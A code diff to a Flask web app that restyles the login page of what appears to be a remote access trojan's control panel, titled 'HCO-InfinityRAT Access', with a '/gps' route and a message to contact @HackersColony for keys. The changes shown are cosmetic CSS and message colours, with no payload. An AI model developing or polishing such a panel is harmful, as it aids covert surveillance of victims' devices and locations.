@@ -64,7 +64,7 @@ login_html = '''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Access Panel</title>
+    <title>HCO-InfinityRAT Access</title>
     <style>
         body {{
             background-color: black;
@@ -73,8 +73,14 @@ login_html = '''
             text-align: center;
             padding-top: 100px;
         }}
+        h2 {{
+            font-size: 28px;
+        }}
+        form {{
+            margin-top: 30px;
+        }}
         input {{
-            padding: 10px;
+            padding: 12px;
             margin: 10px;
             border-radius: 5px;
             border: 1px solid #00FF00;
@@ -85,9 +91,14 @@ login_html = '''
             background-color: #00FF00;
             color: black;
             font-weight: bold;
+            cursor: pointer;
+        }}
+        .submit:hover {{
+            background-color: #0f0;
         }}
         p {{
-            margin-top: 30px;
+            margin-top: 40px;
+            font-size: 16px;
         }}
     </style>
 </head>
@@ -113,7 +124,7 @@ def home():
             if key == ACCESS_KEY:
                 authenticated_ips.add(ip)
             else:
-                return "<h3>❌ Invalid Key</h3><p>DM @HackersColony for valid access.</p>"
+                return "<h3 style='color:red;'>❌ Invalid Key</h3><p style='color:white;'>DM @HackersColony for valid access.</p>"
         else:
             return login_html
     return dashboard_html
@@ -122,7 +133,7 @@ def home():
 def logout():
     ip = request.remote_addr
     authenticated_ips.discard(ip)
-    return "<h3>✅ Logged out. <a href='/'>Login again</a></h3>"
+    return "<h3 style='color:lime;'>✅ Logged out. <a href='/'>Login again</a></h3>"
 
 @app.route("/gps")
 def gps():
